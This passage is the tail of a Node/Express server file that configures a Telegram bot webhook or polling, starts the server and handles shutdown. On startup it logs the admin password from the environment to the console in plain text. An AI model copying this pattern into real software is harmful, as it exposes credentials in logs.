    app.use(bot.webhookCallback('/telegram/webhook'));
    bot.telegram.setWebhook(`${process.env.BASE_URL}/telegram/webhook`, { secret_token: secret })
      .then(() => console.log('✅ webhook set'))
      .catch(e => console.error('webhook error:', e.message));
  } else {
    bot.launch()
      .then(() => console.log('🤖 bot polling started'))
      .catch(e => console.error('bot launch error:', e.message));
  }
}

const server = app.listen(process.env.PORT || 3000, () => {
  console.log(`\n🌐 http://localhost:${process.env.PORT || 3000}`);
  console.log(`📄 Admin: http://localhost:${process.env.PORT || 3000}/admin`);
  console.log(`🔐 Password: ${process.env.ADMIN_PASSWORD}\n`);
});

process.once('SIGINT', () => { bot?.stop('SIGINT'); server.close(); });
process.once('SIGTERM', () => { bot?.stop('SIGTERM'); server.close(); });

export default app;
